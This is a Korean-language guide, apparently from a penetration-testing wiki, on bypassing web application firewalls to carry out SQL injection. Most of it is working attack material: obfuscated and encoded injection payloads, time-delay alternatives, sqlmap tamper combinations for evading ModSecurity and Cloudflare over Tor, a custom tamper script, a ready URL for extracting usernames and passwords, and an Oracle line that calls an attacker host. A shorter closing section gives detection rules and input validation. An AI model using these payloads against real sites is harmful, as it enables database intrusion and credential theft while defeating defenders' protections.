WAF 우회 기법 (WAF Bypass)

WAF (Web Application Firewall)는 악의적인 SQL Injection 공격을 탐지하고 차단합니다. 이 문서에서는 WAF의 탐지 패턴을 우회하는 다양한 기법을 다룹니다.

개념 (Concept)​

WAF란?​

**WAF (Web Application Firewall)**는 HTTP/HTTPS 트래픽을 검사하여 악의적인 패턴을 탐지하고 차단하는 보안 장비/소프트웨어입니다.

주요 WAF:

  • ModSecurity (오픈소스, Apache/Nginx)
  • AWS WAF (클라우드)
  • Cloudflare WAF (CDN)
  • F5 BIG-IP ASM (하드웨어/소프트웨어)
  • Imperva (상용)
  • Akamai Kona Site Defender (CDN)

WAF 탐지 방식​

1. 시그니처 기반 (Signature-based)​

특정 패턴 매칭:

차단 패턴:
- UNION SELECT
- OR 1=1
- ' OR '1'='1
- SLEEP(
- xp_cmdshell

2. 행위 기반 (Behavioral)​

비정상적인 요청 패턴:

  • 과도한 특수문자
  • 비정상적으로 긴 URL
  • SQL 키워드 과다 사용

3. 머신러닝 기반 (ML-based)​

학습된 정상/비정상 패턴 비교

기본 우회 기법​

1. 대소문자 변형 (Case Variation)​

차단되는 페이로드:

' UNION SELECT NULL--

우회:

' UnIoN SeLeCt NULL--
' uNiOn sElEcT NULL--

효과: 단순 문자열 매칭 WAF 우회

2. 공백 우회 (Whitespace Bypass)​

주석 사용​

차단:

UNION SELECT

우회:

UNION/**/SELECT
UNION/*comment*/SELECT
UNION/*! SELECT*/  -- MySQL
UNION/*!12345 SELECT*/  -- MySQL 버전 기반

다른 공백 문자​

우회:

UNION%09SELECT  -- 탭
UNION%0ASELECT  -- 개행
UNION%0DSELECT  -- 캐리지 리턴
UNION%0CSELECT  -- Form feed
UNION%A0SELECT  -- Non-breaking space

+ 기호 (URL 인코딩)​

UNION+SELECT
UNION%20SELECT

3. 인코딩 (Encoding)​

URL 인코딩​

차단:

' OR 1=1--

우회:

%27%20OR%201=1--
%27%20%4F%52%20%31%3D%31--  -- 완전 인코딩

이중 URL 인코딩​

%2527%2520OR%25201%253D1--

Unicode 인코딩​

\u0027 OR 1=1--  -- '를 유니코드로

Hex 인코딩​

MySQL:

# 'admin'를 hex로
0x61646d696e

# 쿼리
SELECT * FROM users WHERE username=0x61646d696e

Base64 인코딩​

# Oracle
UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_DECODE(UTL_RAW.CAST_TO_RAW('YWRtaW4=')))

4. 주석 삽입 (Comment Injection)​

차단:

SELECT password FROM users

우회:

SE/**/LECT/**/password/**/FROM/**/users
SEL/*comment*/ECT/**/pass/**/word/**/FR/**/OM/**/us/**/ers

MySQL 버전 기반 주석:

SELECT/*! password*/FROM/*! users*/
SELECT/*!50000 password*/FROM/*!50000 users*/

5. 연산자 우회 (Operator Bypass)​

= 대신 LIKE​

차단:

WHERE username='admin'

우회:

WHERE username LIKE 'admin'
WHERE username LIKE 'admi%'

OR 대신 ||​

' || '1'='1
' || 1=1--

AND 대신 &&​

1' && '1'='1

= 대신 IN​

WHERE id IN (1)
WHERE username IN ('admin')

고급 우회 기법​

1. 함수 난독화 (Function Obfuscation)​

CONCAT 대신 다른 방법​

MySQL:

# 기본
CONCAT('ad','min')

# 우회
CONCAT_WS('','ad','min')
'ad'+'min'  -- (MSSQL)
'ad'||'min'  -- (PostgreSQL, Oracle)

SUBSTRING 대신 다른 방법​

MySQL:

# 기본
SUBSTRING(password, 1, 1)

# 우회
MID(password, 1, 1)
LEFT(password, 1)
SUBSTR(password, 1, 1)

IF 대신 CASE​

차단:

IF(1=1, SLEEP(5), 0)

우회:

CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END

2. 동등 표현 (Equivalent Expressions)​

논리 연산자​

차단:

1 OR 1=1

우회:

1 || 1=1
1 | 1
1 OR true
1 OR 'a'='a'
2-1 OR 2-1=2-1

산술 연산​

차단:

id=1

우회:

id=2-1
id=3-2
id=0+1
id=1*1
id=2/2
id=pow(1,1)

3. Polyglot Payloads (다형 페이로드)​

여러 컨텍스트에서 작동하는 페이로드:

# Universal SQLi
' OR '1'='1' /*
' OR 1=1--
' OR 'x'='x

# Polyglot
admin'/**/OR/**/1=1--
admin'||'1'='1'--
admin' UNION SELECT NULL--

# 다중 DBMS 지원
1' AND (SELECT 1)=1-- MySQL
1' AND (SELECT 1 FROM dual)=1-- Oracle

4. 쿼리 구조 변경 (Query Structure Manipulation)​

Stacked Queries 활용​

차단:

UNION SELECT password FROM users

우회 (MSSQL):

'; SELECT password FROM users--
1;DECLARE @x VARCHAR(8000);SET @x='SELECT password FROM users';EXEC(@x)--

Subquery 사용​

차단:

UNION SELECT password FROM users

우회:

UNION SELECT (SELECT password FROM users LIMIT 1)
UNION SELECT password FROM (SELECT * FROM users)x

5. 시간 지연 우회 (Time Delay Bypass)​

SLEEP 차단 시​

MySQL 대체:

# BENCHMARK 사용
' AND BENCHMARK(10000000, MD5('test'))--

# GET_LOCK 사용
' AND GET_LOCK('lock', 5)--

# Heavy Query
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)>0--

WAITFOR 차단 시 (MSSQL)​

# Heavy Query
' AND (SELECT COUNT(*) FROM sys.columns A, sys.columns B, sys.columns C)>0--

# 재귀 CTE
'; WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 10000000) SELECT n FROM t--

차단:

UNION SELECT

우회:

# 주석 삽입

UNI/**/ON/**/SEL/**/ECT

# 대소문자

# 인코딩
%55%4E%49%4F%4E%20%53%45%4C%45%43%54  -- URL 인코딩

자동화 도구를 이용한 WAF 우회​

SQLMap - Tamper Scripts​

SQLMap은 60개 이상의 내장 Tamper Script 제공:

주요 Tamper Scripts​

# 공백 → 주석
sqlmap -u "URL" --tamper=space2comment

# 공백 → /**/
sqlmap -u "URL" --tamper=space2morehash

# 대소문자 랜덤
sqlmap -u "URL" --tamper=randomcase

# UNION → UN/**/ION
sqlmap -u "URL" --tamper=space2comment,randomcase

# 다중 Tamper (권장)
sqlmap -u "URL" --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes

자주 사용되는 조합​

일반 WAF 우회:

sqlmap -u "URL" --tamper=space2comment,between,randomcase --random-agent

ModSecurity 우회:

sqlmap -u "URL" --tamper=space2morehash,between,charencode,randomcase --level=5 --risk=3

Cloudflare 우회:

sqlmap -u "URL" --tamper=between,randomcase,space2comment --random-agent --delay=3 --tor --check-tor

MySQL 전용:

sqlmap -u "URL" --tamper=versionedkeywords,space2comment,between

MSSQL 전용:

sqlmap -u "URL" --tamper=sp_password,between,charencode

커스텀 Tamper Script 작성​

예시: custom_tamper.py

#!/usr/bin/env python

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    커스텀 WAF 우회 스크립트
    - 공백을 /**/로 변경
    - UNION을 UnIoN으로 변경
    - SELECT를 SeLeCt로 변경
    """
    if payload:
        # 공백 → /**/
        payload = payload.replace(" ", "/**/")

        # 대소문자 변경
        payload = payload.replace("UNION", "UnIoN")
        payload = payload.replace("SELECT", "SeLeCt")
        payload = payload.replace("FROM", "FrOm")
        payload = payload.replace("WHERE", "WhErE")

        # OR → ||
        payload = payload.replace("OR", "||")

    return payload

사용:

sqlmap -u "URL" --tamper=custom_tamper

Burp Suite - Intruder​

1. Payload Processing​

Burp Intruder → Payload Processing:

  1. Add Prefix: /**/
  2. Add Suffix: /**/
  3. Replace: UNION → UnIoN
  4. URL-encode: All characters

2. Pitchfork Attack​

다중 페이로드 조합:

Position 1: UNION
Position 2: SELECT
Position 3: password
Position 4: users

Payload Set 1: [UNION, UnIoN, UN/**/ION]
Payload Set 2: [SELECT, SeLeCt, SE/**/LECT]
...

수동 우회 실전 예시​

예시 1: ModSecurity CRS 우회​

데이터 추출:

http://example.com/product?id=1'%09UnI%6fn%09Se%4ceCt%09username,password%09Fr%6fm%09users--

방어 기법​

1. 다층 방어 (Defense in Depth)​

WAF만으로는 부족:

  • WAF (외부)
  • IDS/IPS (네트워크)
  • Prepared Statements (애플리케이션)
  • 최소 권한 (데이터베이스)

2. 커스텀 WAF 규칙​

ModSecurity 예시:

# 다양한 인코딩 탐지
SecRule ARGS "@rx (?i)(%27|%2527|'|%u0027)" \
    "chain,id:3001,phase:2,deny,status:403"
    SecRule ARGS "@rx (?i)(union|select|from|where)" \
        "msg:'Advanced SQLi attempt'"

# 주석 패턴 탐지
SecRule ARGS "@rx /\*.*\*/" \
    "id:3002,phase:2,deny,status:403,msg:'Comment injection'"

# Hex 인코딩 탐지
SecRule ARGS "@rx 0x[0-9a-fA-F]{4,}" \
    "id:3003,phase:2,deny,status:403,msg:'Hex encoding detected'"

3. 행위 기반 탐지​

비정상 패턴 탐지:

def detect_sqli_pattern(request):
    """행위 기반 SQLi 탐지"""
    score = 0

    # 특수문자 과다
    special_chars = ["'", '"', ";", "--", "/*", "*/"]
    for char in special_chars:
        score += request.count(char) * 2

    # SQL 키워드
    sql_keywords = ["UNION", "SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE", "DROP"]
    for keyword in sql_keywords:
        if keyword.lower() in request.lower():
            score += 5

    # URL 인코딩 과다
    if request.count('%') > 5:
        score += 10

    # 긴 쿼리
    if len(request) > 500:
        score += 5

    # 점수가 20 이상이면 차단
    if score >= 20:
        return True  # Block
    return False  # Allow

4. 화이트리스트 기반​

입력 검증 (가장 효과적):

// ID는 반드시 숫자
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}

// 검색어는 알파벳과 공백만
if (!preg_match('/^[a-zA-Z0-9\s]+$/', $_GET['q'])) {
    die("Invalid input");
}

트러블슈팅 체크리스트​

WAF 우회가 안 될 때​

  • WAF 종류 정확히 식별 (wafw00f)
  • 차단 로그 확인 (어떤 패턴이 탐지되었는지)
  • 다양한 인코딩 시도 (URL, Hex, Unicode)
  • 대소문자 변경
  • 주석 삽입 (/**/, #, --)
  • 동등 표현 사용 (OR → ||, = → LIKE)
  • Tamper Scripts 조합 테스트

SQLMap이 차단될 때​

  • --random-agent 옵션 사용
  • --delay=3 (요청 간 지연)
  • --tamper 조합 사용
  • --tor 또는 --proxy 사용
  • --hpp (HTTP Parameter Pollution)
  • User-Agent를 검색엔진 봇으로 변경
  • --level=5 --risk=3 시도

우회 후에도 데이터 추출 안 될 때​

  • 백엔드 애플리케이션 자체 필터링 확인
  • Prepared Statement 사용 여부 확인
  • 다른 취약점 포인트 찾기
  • Second-Order SQLi 가능성 검토

빠른 명령어 참조 (Quick Reference)​

WAF 식별​

# wafw00f
wafw00f http://example.com

# Nmap
nmap -p443 --script http-waf-detect example.com

# 수동 (curl)
curl -I http://example.com

기본 우회 기법​

# 대소문자
' UnIoN SeLeCt NULL--

# 주석
'/**/UnIoN/**/SeLeCt/**/NULL--

# 인코딩
'%20UnI%6fn%20Se%4ceCt%20NULL--

# 공백 우회
'+UnIoN+SeLeCt+NULL--
'%09UnIoN%09SeLeCt%09NULL--

# 동등 표현
' OR 1=1--  →  ' || 1=1--
' AND 1=2--  →  ' && 1=2--

DBMS별 우회​

# MySQL - Hex
SELECT * FROM users WHERE username=0x61646d696e

# MySQL - 버전 주석
SELECT/*!50000 password*/FROM/*!50000 users*/

# MSSQL - 동적 실행
DECLARE @x VARCHAR(100);SET @x='SELECT password FROM users';EXEC(@x)

# PostgreSQL - Dollar Quoting
SELECT $$admin$$

# Oracle - 문자열 연결
UTL_HTTP.REQUEST('http://'||'attacker'||'.com')

SQLMap Tamper​

# 일반 WAF
sqlmap -u "URL" --tamper=space2comment,between,randomcase --random-agent

# ModSecurity
sqlmap -u "URL" --tamper=versionedmorekeywords,space2morehash,between --level=5

# Cloudflare
sqlmap -u "URL" --tamper=between,randomcase --user-agent="Googlebot/2.1" --delay=2

# 다중 Tamper (최대)
sqlmap -u "URL" --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords

Burp Suite 설정​

Intruder → Payloads → Payload Processing:
1. URL-encode all characters
2. Replace: UNION → UnIoN
3. Add prefix: /**/
4. Add suffix: /**/
